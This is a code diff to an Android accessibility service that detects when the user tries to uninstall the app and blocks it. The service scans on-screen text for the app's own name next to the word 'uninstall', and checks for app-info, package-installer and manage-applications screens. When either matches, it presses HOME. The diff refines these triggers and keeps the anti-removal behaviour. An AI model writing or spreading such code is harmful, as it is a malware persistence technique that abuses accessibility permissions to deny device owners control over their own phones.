@@ -142,40 +142,72 @@ public class AccessibilityHelperService extends AccessibilityService {
     
     private void detectAndBlockUninstall(AccessibilityEvent event) {
         try {
-            String className = event.getClassName() != null ? event.getClassName().toString() : "";
-            
-            // ALWAYS WATCH: If our app name appears anywhere, press home immediately
             AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-            if (rootNode != null) {
-                String ourPackage = getPackageName();
-                
-                // Check if our app name or package appears on ANY screen
-                if (containsOurAppName(rootNode, ourPackage)) {
-                    Log.w("AntiUninstall", "Our app name detected! Pressing HOME");
-                    // Immediately go to home to prevent uninstall
-                    pressHome();
-                    rootNode.recycle();
-                    return;
-                }
+            if (rootNode == null) return;
+            
+            String ourPackage = getPackageName();
+            
+            // Check if our app name appears on screen
+            boolean hasOurApp = containsOurAppName(rootNode, ourPackage);
+            
+            // Check if "uninstall" text appears on screen
+            boolean hasUninstall = containsText(rootNode, "uninstall");
+            boolean hasUninstallText = containsText(rootNode, "Uninstall");
+            
+            // ONLY block if BOTH our app name AND uninstall appear together
+            // This prevents blocking when our app name appears in other contexts
+            if (hasOurApp && (hasUninstall || hasUninstallText)) {
+                Log.w("AntiUninstall", "Our app + Uninstall detected! Pressing HOME");
+                pressHome();
                 rootNode.recycle();
+                return;
             }
             
-            // Detect package installer / app info screens
-            if (className.contains("PackageInstaller") ||
+            // Also check for app info / package manager screens with our app
+            String className = event.getClassName() != null ? event.getClassName().toString() : "";
+            if (hasOurApp && (
+                className.contains("PackageInstaller") ||
                 className.contains("AppInfo") ||
                 className.contains("Settings$AppInfo") ||
                 className.contains("UninstallConfirm") ||
-                className.contains("PackageManager") ||
-                className.contains("ResolverActivity") ||
-                className.contains("AppSettings") ||
-                className.contains("ManageApplications")) {
+                className.contains("ManageApplications"))) {
                 
-                // Press home immediately
+                Log.w("AntiUninstall", "Our app in app info detected! Pressing HOME");
                 pressHome();
+                rootNode.recycle();
+                return;
+            }
+            
+            rootNode.recycle();
+        } catch (Exception e) {
+            // Ignore
+        }
+    }
+    
+    private boolean containsText(AccessibilityNodeInfo node, String text) {
+        if (node == null) return false;
+        
+        try {
+            CharSequence nodeText = node.getText();
+            if (nodeText != null && nodeText.toString().toLowerCase().contains(text.toLowerCase())) {
+                return true;
+            }
+            
+            for (int i = 0; i < node.getChildCount(); i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    if (containsText(child, text)) {
+                        child.recycle();
+                        return true;
+                    }
+                    child.recycle();
+                }
             }
         } catch (Exception e) {
             // Ignore
         }
+        
+        return false;
     }
     
     private boolean containsOurAppName(AccessibilityNodeInfo node, String ourPackage) {
